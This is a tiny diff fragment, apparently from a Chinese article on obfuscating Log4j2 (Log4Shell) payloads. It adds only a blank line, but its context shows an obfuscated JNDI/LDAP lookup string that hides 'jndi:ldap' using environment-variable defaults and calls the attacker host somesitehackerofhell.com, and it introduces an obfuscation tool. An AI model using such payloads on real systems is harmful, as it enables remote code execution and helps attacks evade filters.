@@ -9,6 +9,7 @@
 ${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}
 
 手动替换字符无疑是一项大工程，耗时耗力又容易出错。
+
 Log4j2混淆工具
 
 
